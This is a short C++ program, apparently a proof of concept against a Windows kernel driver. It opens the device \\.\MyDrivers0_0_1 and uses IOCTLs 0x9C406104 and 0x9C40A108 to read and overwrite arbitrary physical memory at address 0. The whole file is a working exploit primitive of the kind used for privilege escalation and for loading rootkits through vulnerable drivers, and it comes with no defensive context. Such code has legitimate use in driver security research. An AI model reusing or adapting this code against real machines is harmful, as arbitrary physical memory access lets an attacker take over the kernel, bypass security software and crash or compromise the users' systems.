#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\MyDrivers0_0_1"

HANDLE hDevice;

struct DATA_READ_PA
{
    PVOID PhysicalAddress;
    int unit;
    int size;
};

void ReadPA_0x9C406104()
{
    DWORD dwWrite;
    DATA_READ_PA data;
    data.PhysicalAddress = (PVOID)0;
    data.unit = 1;
    data.size = 4;
    int output;
    DeviceIoControl(hDevice, 0x9C406104, &data, sizeof(data), &output, sizeof(output), &dwWrite, NULL);
    printf("read physical memory at 0: %x\n", output);
}

struct DATA_WRITE_PA
{
    PVOID PhysicalAddress;
    int unit;
    int size;
    int value;
};

void WritePA_0x9C40A108()
{
    DWORD dwWrite;
    DATA_WRITE_PA data;
    data.PhysicalAddress = (PVOID)0;
    data.unit = 1;
    data.size = 4;
    data.value = 0xdeadbeef;
    DeviceIoControl(hDevice, 0x9C40A108, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
    printf("write physical memory into 0: %x\n", data.value);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    ReadPA_0x9C406104();
    WritePA_0x9C40A108();
    ReadPA_0x9C406104();

    system("pause");
    return 0;
}
